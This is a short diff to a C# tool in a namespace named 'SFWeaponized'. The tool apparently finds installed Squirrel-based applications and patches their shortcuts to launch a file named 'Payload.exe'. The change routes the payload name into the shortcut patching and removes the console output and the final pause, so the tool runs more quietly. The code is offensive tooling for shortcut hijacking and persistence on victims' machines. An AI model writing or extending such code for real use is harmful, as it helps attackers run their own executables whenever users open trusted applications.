@@ -6,21 +6,19 @@ namespace SFWeaponized
     {
         
         public static SquirrelAppManager SquirrelAppManager;
+        public static string Payload = "Payload.exe";
 
         static void Main(string[] args)
         {
-            SquirrelAppManager = new SquirrelAppManager("Payload.exe");
+            SquirrelAppManager = new SquirrelAppManager(Payload);
             SquirrelAppManager.StartSearch();
 
             foreach (var app in SquirrelAppManager.AppList)
             {
-                Console.WriteLine(app.Name);
                 app.CreateShortcut();
                 app.SetShortcutPath();
-                app.PatchShortcut();
+                app.PatchShortcut(Payload);
             }
-
-            Console.ReadLine();
         }
     }
 }
